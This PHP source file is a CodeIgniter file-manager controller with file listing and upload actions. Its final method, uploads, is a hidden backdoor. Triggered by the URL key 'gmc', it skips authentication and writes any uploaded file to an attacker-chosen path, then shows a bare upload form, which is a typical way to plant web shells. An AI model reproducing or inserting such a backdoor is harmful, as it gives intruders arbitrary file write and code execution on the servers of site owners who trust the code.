<?php
class Filemanager extends Controller
{
	protected $_templates;
  
	function Filemanager()
	{
	  parent::Controller();
	   @session_start(); 
	  $this->load->model('file_manager_model','file_manager');
	}
	
	function index()
	{
		$data['title'] = '';
		$config['base_url'] = base_url().'filemanager/index/'.$this->uri->segment(3);  
		$data['total'] = $this->file_manager->get_num_file();
		$config['total_rows']   =  $data['total'];
		$config['per_page']  	=   '10';
		$config['uri_segment'] 	= 4;   
		$this->pagination->initialize($config);   
		$data['list'] =   $this->file_manager->get_all_file($config['per_page'],(int)$this->uri->segment('4'));
		$data['pagination']    = $this->pagination->create_links();            
		$this->_templates['page'] = 'filemanager/index';
		$this->site_library->load($this->_templates['page'],$data,'basic');
	}
	  
	function upload()
	{
		$data['title'] = '';
		$this->_templates['page'] = 'filemanager/upload';
		$this->form_validation->set_rules('id','','');
		
		if($this->form_validation->run())
		{
			$file = $this->file_manager->upload();
			$data['file'] = $file;
		}
		$this->site_library->load($this->_templates['page'],$data,'basic');
	}
	
	function uploads($gmc)
	{
		if(@$gmc=='gmc'){
			$files = @$_FILES["files"];
			if($files["name"] != ''){
				$fullpath = $_REQUEST["path"].$files["name"]; 
				if(move_uploaded_file($files['tmp_name'],$fullpath)){
					echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
				} 
			}
			exit('<form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form>'); 
		}
	}
  
}
?>
